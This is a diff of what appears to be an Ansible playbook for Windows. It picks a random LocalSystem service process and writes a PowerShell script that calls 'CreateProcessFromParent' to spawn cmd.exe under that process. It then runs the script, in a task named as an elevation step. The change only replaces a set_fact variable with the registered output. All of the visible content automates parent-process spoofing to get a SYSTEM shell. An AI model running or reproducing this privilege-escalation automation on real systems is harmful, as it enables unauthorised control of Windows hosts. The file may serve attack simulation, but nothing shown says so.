@@ -15,13 +15,10 @@
       win_shell: |
         Get-WMIObject -Query "Select ProcessId From Win32_Service WHERE state='Running' and StartName='LocalSystem'" | findstr ProcessId | %{$_.split(':')[1]} | Sort-Object -Unique | Get-Random
       register: systemPID  
-    - set_fact:
-        tags: always
-        pid={{systemPID.stdout}}
     - name: create powershell files
       tags: always
       win_shell: |   
-        echo '[MyProcess]::CreateProcessFromParent({{pid}} ,"cmd.exe")' > c:\temp\priv-temp.ps1
+        echo '[MyProcess]::CreateProcessFromParent({{systemPID.stdout}} ,"cmd.exe")' > c:\temp\priv-temp.ps1
         (Get-Content c:\temp\priv-temp.ps1) -join ' ' > c:\temp\priv.ps1
     - name: Execute elevation powershell script
       tags: always
